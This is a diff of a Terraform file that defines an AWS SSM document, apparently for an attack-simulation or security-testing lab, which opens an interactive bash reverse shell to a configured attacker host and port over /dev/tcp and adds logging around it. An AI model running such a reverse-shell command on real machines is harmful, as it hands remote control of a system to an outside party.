@@ -1,6 +1,5 @@
 locals {
-    pid_path = "/var/run/nc_listener"
-
+    pid_path = "/var/run/nc_target"
     host_ip = var.host_ip
     host_port = var.host_port
 }
@@ -28,11 +27,13 @@ resource "aws_ssm_document" "exec_reverse_shell_target" {
                     "runCommand": [
                         "echo \"Attacker Host: ${local.host_ip}:${local.host_port}\" > /tmp/attacker_exec_reverseshell_target.log",
                         "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
+                        "echo \"sleeping\" >> /tmp/attacker_exec_reverseshell_target.log",
                         "sleep 10",
                         # "while ! nc -w 1 ${local.host_ip} ${local.host_port}; do echo \"waiting for port...\" >> /tmp/attacker_exec_reverseshell_target.log; sleep 5; done",
-                        "bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1  &",
+                        "echo \"Running: bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1\" >> /tmp/attacker_exec_reverseshell_target.log",
+                        "bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1 &",
                         "echo -n $! > ${local.pid_path}",
-                        "echo \"Reverse Shell Connected...\"",
+                        "echo \"Reverse Shell Connected...\" >> /tmp/attacker_exec_reverseshell_target.log",
                         "touch /tmp/attacker_exec_reverseshell_target",
                     ]
                 }
